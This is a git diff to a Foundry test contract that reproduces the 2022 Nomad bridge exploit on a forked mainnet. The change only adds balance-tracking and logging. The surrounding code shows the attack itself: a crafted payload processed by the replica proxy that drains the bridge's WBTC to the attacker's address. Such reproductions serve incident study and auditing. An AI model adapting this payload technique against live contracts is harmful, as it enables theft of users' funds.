@@ -5,6 +5,8 @@ import "forge-std/Test.sol";
 import {TestHarness} from "../TestHarness.sol";
 import {IERC20} from "../interfaces/IERC20.sol";
 
+import {TokenBalanceTracker} from '../modules/TokenBalanceTracker.sol';
+
 // forge test --match-contract Exploit_Nomad -vvv
 /*
 On Aug 1st, 2022 ~190MM AMOUNT were stole from Nomad Bridge because of a bad initialization of the tree root.
@@ -98,7 +100,7 @@ interface INomadReplica {
     function acceptableRoot(bytes32 _root) external view returns (bool);
 }
 
-contract Exploit_Nomad is TestHarness {
+contract Exploit_Nomad is TestHarness, TokenBalanceTracker {
 
     address internal constant NOMAD_DEPLOYER = 0xA5bD5c661f373256c0cCfbc628Fd52DE74f9BB55;
     address internal constant attacker = address(0xa8C83B1b30291A3a1a118058b5445cC83041Cd9d);
@@ -117,13 +119,19 @@ contract Exploit_Nomad is TestHarness {
     function setUp() external {
         cheat.createSelectFork("mainnet", 15259100); // We pin one block before the attacker starts to drain the bridge after he sent the 0.1 WBTC tx on Moonbeam.
         cheat.label(NOMAD_DEPLOYER, "Nomad Deployer");
+
+        addTokenToTracker(address(WBTC));
+        
+        console.log("\nInitial balances:");
+        updateBalanceTracker(ercBridge);
+        updateBalanceTracker(attacker);
+
+        logBalancesWithLabel("Bridge", ercBridge);
+        logBalancesWithLabel("Attacker", attacker);
     }
 
     function test_attack() external {
-        console.log("Initial WBTC balances:");
-        console.log("Bridge", WBTC.balanceOf(ercBridge));
-        console.log("Attacker", WBTC.balanceOf(attacker));
-        
+
         bytes memory payload = getPayload(attacker, address(WBTC), WBTC.balanceOf(ercBridge));
         emit log_named_bytes("\nTx Payload", payload); 
         
@@ -131,9 +139,9 @@ contract Exploit_Nomad is TestHarness {
         bool success = replicaProxy.process(payload);
         require(success, "Process failed");
 
-        console.log("\nFinal WBTC balances:");
-        console.log("Bridge", WBTC.balanceOf(ercBridge));
-        console.log("Attacker", WBTC.balanceOf(attacker));
+        console.log("\nFinal balances:");
+        logBalancesWithLabel("Bridge", ercBridge);
+        logBalancesWithLabel("Attacker", attacker);
     }
 
     function getPayload(address recipient, address token, uint256 amount) public pure returns (bytes memory) {
